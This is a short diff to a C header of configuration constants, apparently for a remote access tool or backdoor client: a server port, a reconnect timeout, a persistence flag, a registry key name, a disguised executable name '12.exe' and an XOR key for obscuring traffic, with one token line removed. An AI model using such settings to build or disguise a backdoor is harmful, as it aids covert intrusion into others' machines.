@@ -9,7 +9,6 @@
 #define PORT 8888 //Port of server
 #define AUTO_PERSISTENCE false
 #define TIMEOUT 3000//Seconds for reconnect to server during a disconnection
-#define TOKEN "|GENERATE_TOKEN|" //the token
 #define NAME_PROG "12.exe" //Name of prog
 #define NAME_KEY_REGISTER  "win64" 
 #define XOR_KEY "123456789" //The key to encrypt and decrypt data using the XOR algorithm
